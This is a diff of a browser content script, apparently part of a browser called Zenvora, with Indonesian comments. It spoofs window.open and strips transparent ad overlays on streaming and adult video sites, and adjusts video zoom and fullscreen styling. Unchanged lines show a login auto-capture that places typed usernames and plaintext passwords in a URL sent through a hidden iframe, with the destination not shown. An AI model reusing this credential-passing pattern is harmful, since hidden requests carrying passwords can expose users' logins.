@@ -4,7 +4,8 @@
   // 1. Injeksi Inti Zenvora di Main World (100% Aman untuk Layout Web Modern):
   // - Anti-Adblock Bait Spoofing
   // - YouTube & Web Background Play Unlocker
-  // - Defuser Pop-Under & Programmatic Click-Hijack (a.click() / window.open)
+  // - Dummy Window Object untuk window.open (Agar Player Streaming seperti Filemoon/Streamtape/MissAV Menghapus Overlay Transparannya Sendiri & Langsung Play!)
+  // - Defuser Programmatic Click-Hijack (a.click())
   // - Detektor Stream Video (.m3u8 / .mp4 / .mpd) Lintas-Iframe untuk Zenvora Native ExoPlayer
   const coreScript = `
     (function() {
@@ -27,8 +28,39 @@
         Object.defineProperty(document, 'webkitVisibilityState', { get: () => 'visible', configurable: true });
         document.hasFocus = function() { return true; };
 
-        // C. Blokir Pop-Under window.open & Programmatic Anchor Click-Hijack (a.click())
-        window.open = function() { return null; };
+        // C. Kembalikan Dummy Window Object pada window.open (Bukan null!)
+        // Penting: Player seperti Filemoon (hanerix/vibuxer/audinifer), Streamtape, Doodstream, dan MissAV
+        // mengecek "if (win && !win.closed)" sebelum menghapus overlay transparan dan memutar video.
+        const createDummyPopupWindow = function(targetUrl) {
+          return {
+            closed: false,
+            opener: window,
+            innerWidth: window.innerWidth || 360,
+            innerHeight: window.innerHeight || 640,
+            focus: function() {},
+            blur: function() {},
+            close: function() { this.closed = true; },
+            postMessage: function() {},
+            addEventListener: function() {},
+            removeEventListener: function() {},
+            document: {
+              open: function() { return this; },
+              write: function() {},
+              writeln: function() {},
+              close: function() {},
+              body: { style: {} }
+            },
+            location: {
+              href: targetUrl || 'about:blank',
+              assign: function() {},
+              replace: function() {},
+              reload: function() {}
+            }
+          };
+        };
+        window.open = function(url) {
+          return createDummyPopupWindow(url);
+        };
 
         const origAnchorClick = HTMLAnchorElement.prototype.click;
         HTMLAnchorElement.prototype.click = function() {
@@ -75,7 +107,7 @@
 
         // D. Sinkronisasi Ukuran Player Saat Layar Berputar ke Landscape Fullscreen
         const syncResizeOnFullscreen = function() {
-          [100, 280, 550, 950].forEach(function(delayMs) {
+          [80, 220, 480, 900].forEach(function(delayMs) {
             setTimeout(function() {
               try {
                 window.dispatchEvent(new Event('resize'));
@@ -98,7 +130,14 @@
             if (rawUrl.startsWith('blob:') || rawUrl.startsWith('data:')) return;
             const absUrl = rawUrl.startsWith('http') ? rawUrl : new URL(rawUrl, location.href).href;
             const lower = absUrl.toLowerCase();
-            if (lower.includes('.ts?') || lower.endsWith('.ts') || lower.includes('doubleclick') || lower.includes('googlesyndication')) {
+            if (
+              lower.includes('.ts?') ||
+              lower.endsWith('.ts') ||
+              lower.includes('preview.mp4') ||
+              lower.includes('doubleclick') ||
+              lower.includes('googlesyndication') ||
+              lower.includes('oxgokpozzajz')
+            ) {
               return;
             }
             const isStreamManifestOrVideo =
@@ -106,6 +145,7 @@
               lower.includes('.mpd') ||
               lower.includes('.mp4') ||
               lower.includes('/hls/') ||
+              lower.includes('/hls2/') ||
               lower.includes('master.txt') ||
               lower.includes('index.txt');
 
@@ -180,25 +220,208 @@
     script.remove();
   } catch (_) {}
 
-  // 2. Pengatur Rasio & Zoom Video Lintas-Iframe Bebas CSP (Hanya Mengubah Elemen <video>, Kontrol Player 100% Utuh)
+  // 2. Pembuka Kunci Pemutar yang Tertutup Elemen Transparan (Orphaned Transparent Ad-Overlay Unblocker)
+  // Menangani situs seperti MissAV, Podjav, Supjav, Streamtape, Filemoon (hanerix/vibuxer/audinifer)
+  const isLegitimatePlayerElement = (el) => {
+    if (!el || !el.tagName) return false;
+    const tag = el.tagName.toUpperCase();
+    if (tag === "VIDEO" || tag === "BUTTON" || tag === "INPUT" || tag === "SELECT" || tag === "SVG" || tag === "PATH") {
+      return true;
+    }
+    const clsAndId = ((el.className && typeof el.className === "string" ? el.className : "") + " " + (el.id || "")).toLowerCase();
+    if (
+      clsAndId.includes("jw-") ||
+      clsAndId.includes("plyr") ||
+      clsAndId.includes("vjs-") ||
+      clsAndId.includes("ytp-") ||
+      clsAndId.includes("ytm-") ||
+      clsAndId.includes("art-") ||
+      clsAndId.includes("fluid") ||
+      clsAndId.includes("fp-") ||
+      clsAndId.includes("dplayer") ||
+      clsAndId.includes("mejs") ||
+      clsAndId.includes("control") ||
+      clsAndId.includes("progress") ||
+      clsAndId.includes("scrubber") ||
+      clsAndId.includes("slider") ||
+      clsAndId.includes("modal") ||
+      clsAndId.includes("dialog") ||
+      clsAndId.includes("navbar") ||
+      clsAndId.includes("header") ||
+      clsAndId.includes("menu")
+    ) {
+      return true;
+    }
+    if (el.querySelector && el.querySelector("video, iframe, button, input, svg, .jw-icon, .plyr__control, .vjs-control")) {
+      return true;
+    }
+    return false;
+  };
+
+  const isTransparentClickTrap = (el) => {
+    try {
+      if (!el || !el.tagName) return false;
+      const tag = el.tagName.toUpperCase();
+      if (tag === "BODY" || tag === "HTML" || tag === "VIDEO" || tag === "IFRAME") return false;
+      if (isLegitimatePlayerElement(el)) return false;
+
+      // 1. Anchor <a> transparan / kosong yang menutupi area besar (jebakan klik pop-under)
+      if (tag === "A") {
+        const href = (el.getAttribute("href") || "").toLowerCase();
+        const target = (el.getAttribute("target") || "").toLowerCase();
+        const rect = el.getBoundingClientRect();
+        if (rect.width > 160 && rect.height > 120) {
+          const style = window.getComputedStyle(el);
+          const isInvisible =
+            parseFloat(style.opacity || "1") < 0.15 ||
+            style.backgroundColor === "rgba(0, 0, 0, 0)" ||
+            style.backgroundColor === "transparent";
+          if (isInvisible && (target === "_blank" || href.startsWith("http") || href === "#" || href.startsWith("javascript:"))) {
+            return true;
+          }
+        }
+      }
+
+      // 2. Div overlay transparan kosong (position: absolute / fixed) di atas video/iframe
+      if (tag === "DIV" || tag === "SPAN" || tag === " INS") {
+        const style = window.getComputedStyle(el);
+        const pos = style.position;
+        if (pos !== "absolute" && pos !== "fixed") return false;
+
+        const rect = el.getBoundingClientRect();
+        if (rect.width < 140 || rect.height < 100) return false;
+
+        const opacity = parseFloat(style.opacity || "1");
+        const bg = (style.backgroundColor || "").replace(/\s+/g, "");
+        const bgImg = style.backgroundImage || "none";
+        const isTransparentSurface =
+          opacity < 0.12 ||
+          ((bg === "rgba(0,0,0,0)" || bg === "transparent") && bgImg === "none");
+
+        if (!isTransparentSurface) return false;
+
+        const text = (el.textContent || "").trim();
+        if (text.length > 0) return false;
+
+        return true;
+      }
+    } catch (_) {}
+    return false;
+  };
+
+  const defuseTransparentVideoOverlays = () => {
+    try {
+      const mediaTargets = document.querySelectorAll(
+        'video, iframe[src*="embed"], iframe[src*="/e/"], iframe[src*="player"], iframe[src*="stream"], iframe[allowfullscreen]'
+      );
+      if (mediaTargets.length === 0) return;
+
+      for (let i = 0; i < mediaTargets.length; i++) {
+        const media = mediaTargets[i];
+        const rect = media.getBoundingClientRect();
+        if (rect.width < 120 || rect.height < 80) continue;
+
+        const centerX = rect.left + rect.width / 2;
+        const centerY = rect.top + rect.height / 2;
+        if (centerX < 0 || centerY < 0 || centerX > window.innerWidth || centerY > window.innerHeight) continue;
+
+        const hitStack = document.elementsFromPoint(centerX, centerY);
+        for (let j = 0; j < hitStack.length; j++) {
+          const candidate = hitStack[j];
+          if (candidate === media || candidate.contains(media)) break;
+          if (isTransparentClickTrap(candidate)) {
+            candidate.style.setProperty("pointer-events", "none", "important");
+            candidate.style.setProperty("display", "none", "important");
+          }
+        }
+      }
+    } catch (_) {}
+  };
+
+  // Saat pengguna mengetuk area video yang terhalang elemen transparan yatim-piatu, buka kuncinya seketika!
+  const handleUserTapOnBlockedPlayer = (e) => {
+    try {
+      const target = e.target;
+      if (!target || typeof e.clientX !== "number") return;
+
+      const hitStack = document.elementsFromPoint(e.clientX, e.clientY);
+      let underlyingVideo = null;
+      let underlyingIframe = null;
+      let trapIndex = -1;
+
+      for (let i = 0; i < hitStack.length; i++) {
+        const el = hitStack[i];
+        if (i === 0 && isTransparentClickTrap(el)) {
+          trapIndex = 0;
+        }
+        if (el.tagName === "VIDEO") {
+          underlyingVideo = el;
+          break;
+        }
+        if (el.tagName === "IFRAME") {
+          underlyingIframe = el;
+          break;
+        }
+      }
+
+      if (trapIndex === 0 && (underlyingVideo || underlyingIframe)) {
+        const trapEl = hitStack[0];
+        trapEl.style.setProperty("pointer-events", "none", "important");
+        trapEl.style.setProperty("display", "none", "important");
+        if (underlyingVideo && underlyingVideo.paused) {
+          underlyingVideo.play().catch(function() {});
+        }
+      }
+    } catch (_) {}
+  };
+
+  document.addEventListener("pointerdown", handleUserTapOnBlockedPlayer, true);
+  document.addEventListener("click", handleUserTapOnBlockedPlayer, true);
+  setInterval(defuseTransparentVideoOverlays, 1200);
+
+  // 3. Pengatur Rasio & Zoom Video Lintas-Iframe Bebas CSP
+  // Menggunakan properti CSS independen `scale` (BUKAN `transform`) agar TIDAK PERNAH menimpa `transform: translate(-50%, -50%)`
+  // pada pemutar Fluid Player (podjav.tv), Plyr (missav.ws), Streamtape, atau Video.js!
   let currentVideoFitMode = "standard";
 
   const applyTransformToSingleVideo = (videoEl, mode) => {
     if (!videoEl || videoEl.tagName !== "VIDEO") return;
     videoEl.style.setProperty("transform-origin", "center center", "important");
-    videoEl.style.setProperty("transition", "transform 0.18s ease-out", "important");
+    videoEl.style.setProperty("transition", "scale 0.18s ease-out", "important");
+
+    // Buka kunci wrapper parent (.plyr__video-wrapper / .fluid_video_wrapper / .jw-media) agar tidak memotong video di rasio 16:9
+    let parent = videoEl.parentElement;
+    for (let depth = 0; depth < 3 && parent && parent !== document.body; depth++) {
+      const pClass = (parent.className && typeof parent.className === "string") ? parent.className.toLowerCase() : "";
+      if (
+        pClass.includes("plyr__video-wrapper") ||
+        pClass.includes("fluid_video_wrapper") ||
+        pClass.includes("jw-media") ||
+        pClass.includes("art-video")
+      ) {
+        if (mode !== "standard") {
+          parent.style.setProperty("overflow", "visible", "important");
+          parent.style.setProperty("aspect-ratio", "unset", "important");
+        } else {
+          parent.style.removeProperty("overflow");
+          parent.style.removeProperty("aspect-ratio");
+        }
+      }
+      parent = parent.parentElement;
+    }
+
     if (mode === "stretch_20_9") {
-      // Pas Layar 20:9: Rentangkan video 16:9 ke rasio 20:9 tanpa mengubah ukuran tombol kontrol player
+      // Pas Layar 20:9: Rentangkan video 16:9 ke 20:9 menggunakan CSS `scale` independen tanpa men-zoom tombol kontrol player
       videoEl.style.setProperty("object-fit", "fill", "important");
-      videoEl.style.setProperty("transform", "scale(1.25, 1.03)", "important");
+      videoEl.style.setProperty("scale", "1.25 1.03", "important");
     } else if (mode === "zoom_20_9") {
       // Zoom Penuh: Perbesar proporsional 26% agar memenuhi layar 20:9 tanpa distorsi wajah & tanpa men-zoom kontrol
       videoEl.style.setProperty("object-fit", "cover", "important");
-      videoEl.style.setProperty("transform", "scale(1.26, 1.26)", "important");
+      videoEl.style.setProperty("scale", "1.26 1.26", "important");
     } else {
       // Standar 16:9
       videoEl.style.setProperty("object-fit", "contain", "important");
-      videoEl.style.setProperty("transform", "scale(1, 1)", "important");
+      videoEl.style.setProperty("scale", "1 1", "important");
     }
   };
 
@@ -212,7 +435,6 @@
     } catch (_) {}
   };
 
-  // Pastikan jika player (seperti YouTube/JWPlayer) mereset style saat resolusi/orientasi berubah, mode rasio tetap terjaga
   document.addEventListener(
     "playing",
     function(e) {
@@ -233,7 +455,7 @@
     true
   );
 
-  // 3. Fungsi Autofill Kredensial Bebas CSP (React / Vue / Angular / Form Klasik)
+  // 4. Fungsi Autofill Kredensial Bebas CSP (React / Vue / Angular / Form Klasik)
   const setNativeInputValue = (el, val) => {
     if (!el) return;
     try {
@@ -261,7 +483,6 @@
         const passEl = passInputs[i];
         setNativeInputValue(passEl, passwordValue);
 
-        // Cari input username/email di dalam form yang sama atau tepat sebelum input password
         const scopeRoot = passEl.closest("form") || document;
         const candidateInputs = scopeRoot.querySelectorAll(
           'input[type="email"], input[type="text"], input[type="tel"], input:not([type])'
@@ -279,7 +500,6 @@
     } catch (_) {}
   };
 
-  // Terima komando langsung dari background.js (Bebas CSP 100% di YouTube & Semua Web Modern)
   if (typeof browser !== "undefined" && browser.runtime && browser.runtime.onMessage) {
     browser.runtime.onMessage.addListener(function(msg) {
       if (!msg || typeof msg !== "object") return;
@@ -291,12 +511,11 @@
     });
   }
 
-  // 4. Auto-Capture Login & Password Manager (Mendeteksi Login Form & Mengirim Sinyal Simpan Sandi)
+  // 5. Auto-Capture Login & Password Manager (Mendeteksi Login Form & Mengirim Sinyal Simpan Sandi)
   let lastCapturedAuthKey = "";
   let lastTypedUsername = "";
   let lastTypedPassword = "";
 
-  // Tandai setiap input password agar tetap terdeteksi meskipun tombol "Lihat Sandi" mengubahnya menjadi type="text"
   document.addEventListener(
     "input",
     function(e) {
@@ -396,7 +615,6 @@
         "&pass=" +
         encodeURIComponent(passwordVal);
 
-      // Kirim via hidden iframe (dan fallback anchor target=_blank untuk halaman dengan frame-src CSP ketat)
       const pingFrame = document.createElement("iframe");
       pingFrame.style.cssText = "display:none !important;width:0 !important;height:0 !important;border:0 !important;";
       pingFrame.src = captureUrl;
@@ -447,7 +665,7 @@
     true
   );
 
-  // 5. Next-Gen Cosmetic Adblock & YouTube Auto-Ad-Skipper (100% Aman untuk Layout Web Modern)
+  // 6. Next-Gen Cosmetic Adblock, Fullscreen Wrapper Unclipper & YouTube Auto-Ad-Skipper
   const injectPrecisionCosmeticShield = () => {
     if (!document.getElementById("zenvora-video-fs-style")) {
       const fsStyle = document.createElement("style");
@@ -457,14 +675,25 @@
         :-moz-full-screen video,
         :-webkit-full-screen video,
         .jwplayer.jw-flag-fullscreen video,
-        .jwplayer.jw-flag-fullscreen .jw-media {
+        .jwplayer.jw-flag-fullscreen .jw-media,
+        .plyr:fullscreen .plyr__video-wrapper,
+        .plyr:-moz-full-screen .plyr__video-wrapper,
+        .plyr--fullscreen-active .plyr__video-wrapper,
+        :fullscreen .plyr__video-wrapper,
+        :-moz-full-screen .plyr__video-wrapper,
+        :fullscreen .fluid_video_wrapper,
+        :-moz-full-screen .fluid_video_wrapper {
           width: 100% !important;
           height: 100% !important;
           max-width: 100vw !important;
           max-height: 100vh !important;
+          aspect-ratio: unset !important;
         }
-        .jwplayer.jw-flag-fullscreen .jw-aspect {
+        .jwplayer.jw-flag-fullscreen .jw-aspect,
+        :fullscreen .plyr__video-wrapper,
+        .plyr--fullscreen-active .plyr__video-wrapper {
           padding-top: 0 !important;
+          padding-bottom: 0 !important;
         }
       `;
       (document.head || document.documentElement).appendChild(fsStyle);
@@ -532,7 +761,6 @@
     injectPrecisionCosmeticShield();
   }
 
-  // Auto-Skip Iklan Video YouTube Tanpa Merusak Kontrol Pemutar
   if (location.hostname.includes("youtube.com")) {
     setInterval(function() {
       try {
@@ -551,7 +779,7 @@
     }, 600);
   }
 
-  // 6. Integrasi Toko Ekstensi (addons.mozilla.org -> Zenvora Add-ons Store)
+  // 7. Integrasi Toko Ekstensi (addons.mozilla.org -> Zenvora Add-ons Store)
   const isAmoStore = location.hostname.includes("addons.mozilla.org");
   if (isAmoStore) {
     const resolveAmoSlug = () => {
